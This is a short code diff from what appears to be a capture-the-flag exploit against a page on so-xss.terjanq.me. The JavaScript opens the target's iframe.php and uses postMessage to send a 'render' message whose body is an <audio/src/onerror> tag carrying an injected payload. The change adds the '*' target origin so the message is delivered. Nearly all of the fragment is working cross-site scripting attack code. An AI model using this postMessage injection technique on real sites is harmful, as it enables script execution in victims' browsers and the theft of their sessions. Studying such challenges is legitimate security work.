@@ -16,7 +16,7 @@ iframe.srcdoc=`<h1>hello</h1>
     let w=window.open("https://so-xss.terjanq.me/iframe.php");
     onmessage => top.location="https://so-xss.terjanq.me/iframe.php";
    setTimeout(()=>{
-    w.postMessage({type:'render',body:<audio/src/onerror=\\"${payload}\\"});},1000);
+    w.postMessage({type:'render',body:<audio/src/onerror=\\"${payload}\\"},'*');},1000);
 
  
  }
